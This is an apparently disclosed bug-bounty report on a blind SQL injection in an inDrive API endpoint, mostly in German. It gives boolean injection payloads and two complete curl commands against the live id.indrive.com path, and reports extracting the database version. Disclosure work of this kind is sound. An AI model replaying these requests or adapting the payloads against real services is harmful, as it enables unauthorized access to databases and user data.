# Blind SQL injection on id.indrive.com

## Target

Reported to: inDrive
Disclosed: November 24, 2023, 2:37pm UTC
Severity: Critical (9 ~ 10)
Weakness: Blind SQL Injection
Bounty: $4,134
CVE ID: None
Account details: None

## Summary

Der Server führt keine Bereinigung bei Benutzereingaben durch, sodass ein Angreifer beliebige SQL-Befehle in eine Abfrage einfügen kann

## Steps To Reproduce

1. Gehe zu https://promo.indrive.com/10ridestogetprize_ru/random
2. Klicken Sie auf „Generieren“.

   	Eine Anfrage an https://id.indrive.com/api/ten-drives/custom-winners/ten_drive_kz_second_weeks/number_trips/29/5/phone wird gemacht

	████████

3. Wiederholen Sie diese Anfrage, aber ändern Sie den Pfad zu 
   /api/ten-drives/custom-winners/ten_drive_kz_second_weeks/number_trips/1/999%20or%201=1--

	Ein zufälliger Eintrag aus der Datenbank wird zurückgegeben

	████

4. Ändern Sie den Pfad in einer Abfrage an 
   /api/ten-drives/custom-winners/ten_drive_kz_second_weeks/number_trips/1/999%20or%201=2--

	Die Antwort vom Server wird leer sein

	███████

5. Beide Anfragen im [[Curl]]-Format

	```bash

	curl -i -s -k -X $'GET' \
    	-H $'Host: id.indrive.com' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0' 
	-H $'Accept: application/json, text/plain, */*' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' 
	-H $'Origin: https://promo.indrive.com' -H $'Referer: https://promo.indrive.com/' -H $'Sec-Fetch-Dest: empty' 
	-H $'Sec-Fetch-Mode: cors' -H $'Sec-Fetch-Site: same-site' -H $'Te: trailers' -H $'Connection: close' \
    	$'https://id.indrive.com/api/ten-drives/custom-winners/ten_drive_kz_second_weeks/number_trips/1/999%20or%201=1--'

	```

	```bash	

	curl -i -s -k -X $'GET' \
	-H $'Host: id.indrive.com' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0' 
	-H $'Accept: application/json, text/plain, */*' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' 
	-H $'Origin: https://promo.indrive.com' -H $'Referer: https://promo.indrive.com/' -H $'Sec-Fetch-Dest: empty' -H $'Sec-Fetch-Mode: cors' 
	-H $'Sec-Fetch-Site: same-site' -H $'Te: trailers' -H $'Connection: close' \
 	$'https://id.indrive.com/api/ten-drives/custom-winners/ten_drive_kz_second_weeks/number_trips/1/999%20or%201=2--'

	```

## Impact

Diese Sicherheitsanfälligkeit ermöglicht es Angreifern, beliebige SQL-Anweisungen in einer Abfrage einzufügen.
Zum Beispiel konnte ich die SQL-Version abrufen:
PostgreSQL 14.8 (Ubuntu 14.8-0ubuntu0.22.04.1).